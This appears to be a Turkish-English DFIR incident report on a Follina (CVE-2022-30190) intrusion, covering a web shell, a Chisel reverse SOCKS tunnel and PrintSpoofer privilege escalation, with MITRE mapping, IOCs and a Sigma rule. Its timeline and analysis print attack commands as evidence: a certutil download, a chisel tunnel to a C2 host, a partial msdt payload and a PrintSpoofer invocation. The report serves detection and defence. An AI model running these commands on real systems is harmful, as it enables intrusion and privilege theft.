# 🔍 Incident Investigation Report: Web Exploit, Follina (CVE-2022-30190), SOCKS Tunneling & Privilege Escalation

**Case Reference:** IR-2022-0623-TMP  
**Target Organization:** Global Tech Enterprise  
**Incident Classification:** Critical (Severity 1 - P1)  
**Affected Hostnames / Servers:** Public Web Server (DMZ), `WKSTN-FINANCE` (Finance Department), `AD-DC01` (Domain Environment)  
**Date of Incident:** June 2022  
**Lead Investigator:** Ahmet Furkan Hüsmek (Junior SOC / DFIR Analyst)  

---

## 1. Executive Summary (Yönetici Özeti)

Kurumun DMZ bölgesinde dış dünyaya açık web uygulaması üzerinde uzaktan kod yürütme (RCE) zafiyeti istismar edilerek ilk ihlal gerçekleşmiştir. Tehdit aktörü, elde ettiği düşük yetkili web kabuğu (web shell) üzerinden iç ağa doğru ilerlemiş ve iç ağdaki kullanıcılara yönelik **Follina (CVE-2022-30190 - Microsoft Support Diagnostic Tool - MSDT)** zafiyetini kullanan zararlı bir belge iletmiştir.

İç ağdaki finans iş istasyonunun ihlal edilmesinin ardından, kurum içi güvenlik duvarı ve segmentasyon kurallarını baypas etmek amacıyla **Chisel** aracı vasıtasıyla şifreli bir SOCKS5 tüneli kurulmuştur. Saldırgan iç ağda eriştiği sistemde yerel haklarını en yüksek seviyeye çıkarmak için Adlandırılmış Boru (Named Pipe) taklit tekniğini kullanan **PrintSpoofer** exploit'ini devreye almış ve `NT AUTHORITY\SYSTEM` yetkilerine ulaşmıştır.

SOC ve adli analiz ekibimiz; Splunk SIEM logları, Sysmon olay kayıtları ve ağ analizleri üzerinden saldırının tüm adımlarını aydınlatmış, kurulan tünelleri ve arka kapıları sonlandırmış, etki alanının güvenliğini sağlamıştır.

---

## 2. Incident Timeline (Zaman Çizelgesi)

| Aşama / Zaman | Olay Yeri | Gerçekleşen Eylem / TTP | Tespit Edilen Süreç / Komut |
| :--- | :--- | :--- | :--- |
| **T0 (Initial Foothold)** | DMZ Web Server | Web zafiyeti sömürülerek web shell yüklendi. | `POST /upload.php` ──► `shell.aspx` |
| **T1 (Internal Phishing)**| Internal Mail | Finans birimine Follina exploit belgesi iletildi. | `Quarterly_Report.docx` |
| **T2 (Follina Exploitation)** | `WKSTN-FINANCE` | MSDT aracı şüpheli parametrelerle tetiklendi. | `msdt.exe` (Parent: `WINWORD.EXE`, CVE-2022-30190) |
| **T3 (Persistence & Drop)** | `WKSTN-FINANCE` | Dış sunucudan tünelleme aracı indirildi. | `certutil.exe -urlcache -split -f .../chisel.exe` |
| **T4 (Network Tunneling)**| Network / Proxy | Dış C2'ye şifreli ters SOCKS tüneli kuruldu. | `chisel.exe client 192.168.1.100:8001 R:socks` |
| **T5 (Privilege Escalation)**| `WKSTN-FINANCE` | SeImpersonatePrivilege istismar edilerek SYSTEM alındı. | `PrintSpoofer.exe -i -c cmd.exe` ──► `NT AUTHORITY\SYSTEM` |

---

## 3. Detailed Technical Analysis (Derinlemesine Teknik Analiz)

### 3.1 Initial Access & Follina (CVE-2022-30190) Istismarı
- **Mekanizma:** Saldırgan, Microsoft Office belgelerinde yer alan harici OLE/HTML şablonu özelliğini suistimal etmiştir. Word belgesi açıldığında uzaktaki HTML dosyası yüklenmiş ve HTML içindeki `ms-msdt:` URI şeması çağrılmıştır.
- **LOLBIN Davranışı:** `WINWORD.EXE`, Microsoft Destek Teşhis Aracı olan `msdt.exe` sürecini başlatmıştır. Bu süreç PowerShell komutlarını arka planda yürüterek makrolar tamamen devre dışı bırakılmış olsa dahi kod çalıştırmayı başarmıştır.
- **Sysmon EID 1 Log Tespiti:**
  ```text
  ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
  Image: C:\Windows\System32\msdt.exe
  CommandLine: "C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=... $(Invoke-Expression...)"

```

### 3.2 Egress & SOCKS5 Tunneling via Chisel

* İç ağ trafiğinin dışarıya doğrudan çıkışını sağlamak ve kurumsal güvenlik duvarı kontrollerini köprülemek için **Chisel** ikilisi `certutil.exe` ile hedefe indirilmiştir.
* **Tünel Komutu:**
```cmd
chisel.exe client <C2_IP>:8001 R:socks

```


* Bu komutla saldırgan, iç ağdaki makine üzerinden tersine yönlendirilmiş bir SOCKS proxy açmış ve kurum dışındaki saldırı makinesinden iç ağ kaynaklarına doğrudan erişim yeteneği kazanmıştır.

### 3.3 Privilege Escalation via PrintSpoofer

* Ele geçirilen servis hesabının kullanıcı yetkileri incelendiğinde (`whoami /priv`), **`SeImpersonatePrivilege`** yetkisinin etkin olduğu görülmüştür.
* Saldırgan, Windows Print Spooler servisini tetikleyerek adlandırılmış bir boru (Named Pipe) oluşturmuş ve bu boruyu taklit ederek doğrudan en yüksek sistem yetkisine (**`NT AUTHORITY\SYSTEM`**) sıçramıştır:
```cmd
PrintSpoofer.exe -i -c cmd.exe

```


* Başarılı exploit sonucunda hedef sistemde tam denetim sağlanmıştır.

---

## 4. MITRE ATT&CK Mapping

| Taktik | Teknik ID | Teknik Adı | Gözlemlenen Eylem |
| --- | --- | --- | --- |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | DMZ üzerindeki web uygulaması istismarı. |
| **Execution** | `T1202` | Indirect Command Execution | Follina (`msdt.exe`) ile dolaylı kod çalıştırma. |
| **Defense Evasion** | `T1218` | System Binary Proxy Execution | `msdt.exe` ve `certutil.exe` LOLBIN istismarı. |
| **Privilege Escalation** | `T1134.001` | Access Token Manipulation: Token Impersonation | `PrintSpoofer` ile `SeImpersonatePrivilege` suistimali. |
| **Command & Control** | `T1572` | Protocol Tunneling | `chisel` ile port 8001 üzerinden SOCKS tüneli oluşturulması. |

---

## 5. Indicators of Compromise (IOCs)

Güvenlik duvarı (Firewall), SIEM ve EDR sistemlerinde derhal bloklanması gereken göstergeler:

### Network Indicators (Defanged)

* `192.168.1[.]100:8001` (Chisel C2 Listener)
* `http://malicious-domain[.]com/exploit.html` (Follina HTML Payload)

### Host & File Artifacts

* `Quarterly_Report.docx` (Malicious Document)
* `chisel.exe` (SOCKS Tunneling Utility)
* `PrintSpoofer.exe` (Privilege Escalation Exploit)
* Execution of `msdt.exe` with `IT_RebrowseForFile` parameters

---

## 6. Remediation & Detection Engineering (İyileştirme & Tespit Önerileri)

### 6.1 Acil Müdahale Adımları (Immediate Containment)

1. **İzolasyon & Tünel Kapatma:** Tünel trafiğini barındıran portlar güvenlik duvarında engellenmeli ve ilgili iş istasyonu derhal ağdan izole edilmelidir.
2. **Follina Yama ve Koruması:** Microsoft'un ilgili güvenlik güncelleştirmesi (KB paketleri) uygulanmalı, geçici önlem olarak `ms-msdt` protokol işleyicisi Kayıt Defteri üzerinden silinmelidir.
3. **Servis Haklarının Sıkılaştırılması:** Servis hesaplarında gereksiz `SeImpersonatePrivilege` yetkileri denetlenmeli ve kaldırılmalıdır.

### 6.2 Örnek Tespit Kuralı: Office Tarafından Başlatılan MSDT Tespiti (Sigma Kuralı)

```yaml
title: MSDT Execution Spawned by Office Applications (Follina)
id: cd26849a-6531-4886-b485-80f089856f61
status: production
description: Detects msdt.exe execution spawned by Microsoft Office products indicative of CVE-2022-30190 exploitation.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
    Image|endswith: '\msdt.exe'
  condition: selection
level: critical
tags:
  - attack.execution
  - attack.defense_evasion
  - attack.t1202
  - cve.2022.30190
